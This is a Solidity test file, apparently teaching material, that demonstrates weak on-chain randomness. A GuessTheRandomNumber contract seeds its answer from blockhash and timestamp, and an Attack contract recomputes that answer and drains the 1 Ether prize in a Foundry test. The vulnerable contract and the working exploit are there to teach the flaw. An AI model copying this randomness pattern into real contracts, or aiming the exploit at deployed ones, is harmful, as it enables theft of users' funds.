// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

/*
GuessTheRandomNumber is a game where you win 1 Ether if you can guess the
pseudo random number generated from block hash and timestamp.

At first glance, it seems impossible to guess the correct number.
But let's see how easy it is win.

1. Alice deploys GuessTheRandomNumber with 1 Ether
2. Eve deploys Attack
3. Eve calls Attack.attack() and wins 1 Ether

What happened?
Attack computed the correct answer by simply copying the code that computes the random number.
*/


contract ContractTest is Test {
        GuessTheRandomNumber GuessTheRandomNumberContract;
        Attack AttackerContract;

function testRandomness() public {

    address alice = vm.addr(1);
    address eve = vm.addr(2);
    vm.deal(address(alice), 1 ether);   
    vm.prank(alice);   

    GuessTheRandomNumberContract = new GuessTheRandomNumber{value: 1 ether}();
    vm.startPrank(eve);   
    AttackerContract = new Attack();
    console.log("Before exploiting, Balance of AttackerContract:",address(AttackerContract).balance);
    AttackerContract.attack(GuessTheRandomNumberContract);  
    console.log("Eve wins 1 Eth, Balance of AttackerContract:",address(AttackerContract).balance);
    console.log("Exploit completed");

    }
    receive() payable external{}
}

contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract Attack {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        guessTheRandomNumber.guess(answer);
    }

    // Helper function to check balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}